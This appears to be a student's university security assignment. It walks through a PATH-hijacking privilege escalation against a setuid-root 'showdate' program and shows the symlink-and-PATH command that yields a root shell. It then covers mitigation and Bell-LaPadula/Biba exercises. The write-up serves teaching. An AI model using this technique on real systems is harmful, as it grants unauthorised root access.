## a
The `showdate` program sets the group and user id to root using `setuid(0)` and `setgid(0)`, then it runs `system("date")`. As the program runs `date` with root privileges, we can start a root shell by substituting `date`.

We can see which system calls `showdate` uses with the `strace` command, here is a complete list:

```
$ strace -f ./showdate 2>&1 | grep -oP "\w+(?=\()" | sort -u
access
arch_prctl
brk
clone
close
execve
exit_group
fcntl
fstat
getegid
geteuid
getgid
getpgrp
getpid
getppid
getuid
ioctl
lseek
mmap
mprotect
munmap
open
openat
prlimit64
read
rt_sigaction
rt_sigprocmask
setgid
setuid
stat
sysinfo
uname
wait4
write
```

## b
We created a symbolic link called `date` in the current directory, to which we have write permissions as a non-privileged user, then we prepended the current directory to the `PATH` environment variable, which is also under out control.

When the `showdate` executable is run, it assumes root privileges due to the `setuid` flag, and the owner of the file being root. It then looks up `date`, which internally uses the `PATH` variable, to which we prepended the directory with the symbolic link to `sh`. Instead of executing the `date` binary as intended, it therefore executes `sh` with root privileges, and we have a root shell.

```sh
hendrik ~/uni/assignment4 % id
uid=1000(hendrik) gid=100(users) groups=100(users), …
hendrik ~/uni/assignment4 % ln -s $(which sh) date && PATH=.:$PATH ./showdate
root ~/uni/assignment4 $ id
uid=0(root) gid=0(root) groups=0(root), …
```

We implemented the attack as a `make` target, so it can simply be executed by running `make exploit`.

## c
During the development of software intended to be run with `setuid-root`, special attention must be payed to not rely on any aspect of the environment controllable by non-root users. This includes environment variables. The attack was possible because the path to `date` was not hardcoded, but it was taken from the environment. We could not alter anything in `/usr/bin`, or `showdate` itself, but we could make the lookup for the `date` executable find what we wanted by altering the `PATH` environment variable, which does not require special privileges.

## a
We assume that both the Bell-LaPadula, and the Biba rules use weak tranquility.

|action|access allowed|Bell-LaPadula level|Biba level|
|-----:|:------------:|:-----------------:|:--------:|
i|\y|unclassified|trusted
ii|\y|unclassified|system
iii|\n|unclassified|system
iv|\y|unclassified|system
v|\y|confidential|system
vi|\n|confidential|system

Peter's process must not drop below level "application", but Biba disallows read-down, so the process is denied access to `/home/peter/database`, because it requires application "user" or lower to be read. The action iii is disallowed.

Action vi is disallowed, because Biba disallows write-up, and the process has level "system", but it would need "trusted" to be allowed to write `/etc/shadow`. Bell-LaPadula allows write-up, so that is not a problem.

## b
After executing the 6 actions from 2a, the process has level ("confidential", "system"). Bell-LaPadula disallows write-down, so the file may have levels "confidential", "secret", or "top secret", but **not** "unclassified". Biba disallows write-up, so the file may have levels "system", "application", "user", or "untrusted", but **not** "trusted".

`/home/peter/out` may have any level in {"confidential", "secret", "top secret"} $\times$ {"system", "application", "user", "untrusted"}, like, for example, ("confidential", "user") or ("secret", "system").
